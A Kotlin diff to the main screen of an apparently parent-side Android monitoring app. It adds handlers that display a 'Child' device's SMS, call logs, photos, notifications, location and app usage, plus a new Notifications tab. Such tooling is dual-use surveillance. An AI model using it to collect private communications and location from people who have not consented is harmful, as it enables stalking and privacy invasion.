@@ -6,6 +6,9 @@ import android.os.Handler
 import android.os.Looper
 import android.widget.Button
 import android.widget.TextView
+import java.text.SimpleDateFormat
+import java.util.Date
+import java.util.Locale
 import androidx.appcompat.app.AppCompatActivity
 import androidx.fragment.app.Fragment
 import androidx.viewpager2.adapter.FragmentStateAdapter
@@ -27,12 +30,13 @@ class MainActivity : AppCompatActivity() {
     }
 
     // ─── Fragment refs ────────────────────────────────────────────────────────
-    var dashboardFragment: DashboardFragment? = null
-    var liveFragment:      LiveFragment?      = null
-    var appsFragment:      AppsFragment?      = null
-    var callSmsFragment:   CallSmsFragment?   = null
-    var locationFragment:  LocationFragment?  = null
-    var filesFragment:     FilesFragment?     = null
+    var dashboardFragment:       DashboardFragment?       = null
+    var liveFragment:            LiveFragment?            = null
+    var appsFragment:            AppsFragment?            = null
+    var callSmsFragment:         CallSmsFragment?         = null
+    var locationFragment:        LocationFragment?        = null
+    var filesFragment:           FilesFragment?           = null
+    var notificationsFragment:   NotificationsFragment?   = null
 
     // ─── Views ───────────────────────────────────────────────────────────────
     private lateinit var tvStatus:   TextView
@@ -87,7 +91,7 @@ class MainActivity : AppCompatActivity() {
     private fun setupViewPager() {
         val pager = findViewById<ViewPager2>(R.id.viewPager)
         val tabs  = findViewById<TabLayout>(R.id.tabLayout)
-        val tabTitles = listOf("Dashboard","Live","Apps","Calls & SMS","Location","Files","Controls","Shizuku","Settings")
+        val tabTitles = listOf("Dashboard","Live","Apps","Calls & SMS","Location","Files","Notifs","Controls","Shizuku","Settings")
 
         pager.adapter = object : FragmentStateAdapter(this) {
             override fun getItemCount() = tabTitles.size
@@ -98,9 +102,10 @@ class MainActivity : AppCompatActivity() {
                 3 -> CallSmsFragment()
                 4 -> LocationFragment()
                 5 -> FilesFragment()
-                6 -> ControlFragment()
-                7 -> ShizukuFragment()
-                8 -> SettingsFragment()
+                6 -> NotificationsFragment()
+                7 -> ControlFragment()
+                8 -> ShizukuFragment()
+                9 -> SettingsFragment()
                 else -> DashboardFragment()
             }
         }
@@ -177,12 +182,45 @@ class MainActivity : AppCompatActivity() {
                 }
             }
             "location" -> {
-                val lat = msg.optDouble("lat"); val lng = msg.optDouble("lng")
-                handler.post { dashboardFragment?.updateLocation(lat, lng) }
+                val lat = msg.optDouble("lat")
+                val lng = msg.optDouble("lng")
+                val acc = msg.optDouble("accuracy", 0.0).toFloat()
+                handler.post {
+                    dashboardFragment?.updateLocation(lat, lng)
+                    locationFragment?.onLocation(lat, lng, acc)
+                }
             }
             "current_app" -> {
                 val pkg = msg.optString("package")
                 handler.post { dashboardFragment?.updateCurrentApp(pkg) }
+            }
+            "app_usage" -> {
+                val arr = msg.optJSONArray("stats")
+                if (arr != null) handler.post { appsFragment?.onData(arr) }
+            }
+            "call_log" -> {
+                val arr = msg.optJSONArray("calls")
+                if (arr != null) handler.post { callSmsFragment?.onCallData(arr) }
+            }
+            "sms" -> {
+                val arr = msg.optJSONArray("messages")
+                if (arr != null) handler.post { callSmsFragment?.onSmsData(arr) }
+            }
+            "gallery" -> {
+                val arr = msg.optJSONArray("photos")
+                if (arr != null) handler.post { filesFragment?.onFiles(arr) }
+            }
+            "notification" -> {
+                val ts = msg.optLong("ts", System.currentTimeMillis())
+                val timeStr = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date(ts))
+                val item = NotificationItem(
+                    app   = msg.optString("app"),
+                    title = msg.optString("title"),
+                    text  = msg.optString("text"),
+                    time  = timeStr,
+                    timestamp = ts
+                )
+                handler.post { notificationsFragment?.addNotification(item) }
             }
             "update_result" -> {
                 val ok  = msg.optBoolean("success")
@@ -190,8 +228,8 @@ class MainActivity : AppCompatActivity() {
                 val err = msg.optString("error", "")
                 handler.post {
                     dashboardFragment?.addLog(
-                        if (ok) "🔄 Child updated to $ver successfully!"
-                        else    "❌ Update failed: $err"
+                        if (ok) "Child updated to $ver successfully!"
+                        else    "Update failed: $err"
                     )
                 }
             }
